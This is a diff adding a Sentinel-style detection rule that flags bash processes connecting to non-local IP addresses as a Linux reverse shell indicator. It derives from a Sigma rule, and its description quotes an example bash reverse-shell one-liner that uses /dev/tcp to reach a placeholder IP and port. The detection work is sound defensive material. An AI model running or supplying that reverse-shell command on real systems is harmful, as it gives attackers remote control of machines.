@@ -1,0 +1,40 @@
+id: a12b6a41-8184-599a-8fd4-6edda9427b69
+name: Linux Reverse Shell Indicator
+description: 'Detects a bash contecting to a remote IP address (often found when actors do something like ''bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'') Reference: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml | Source: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml'
+severity: High
+queryFrequency: PT1H
+queryPeriod: PT1H
+triggerOperator: gt
+triggerThreshold: 0
+tactics:
+- Execution
+query: |-
+  DeviceNetworkEvents
+  | where InitiatingProcessFolderPath endswith "/bin/bash" and (not((RemoteIP in~ ("127.0.0.1", "0.0.0.0"))))
+version: 1.0.0
+kind: Scheduled
+relevantTechniques:
+- T1059
+entityMappings:
+- entityType: Account
+  fieldMappings:
+  - identifier: Name
+    columnName: InitiatingProcessAccountName
+  - identifier: NTDomain
+    columnName: InitiatingProcessAccountDomain
+  - identifier: Sid
+    columnName: InitiatingProcessAccountSid
+- entityType: Host
+  fieldMappings:
+  - identifier: HostName
+    columnName: DeviceName
+  - identifier: AzureID
+    columnName: DeviceId
+- entityType: IP
+  fieldMappings:
+  - identifier: Address
+    columnName: RemoteIP
+requiredDataConnectors:
+- connectorId: MicrosoftThreatProtection
+  dataTypes:
+  - DeviceNetworkEvents
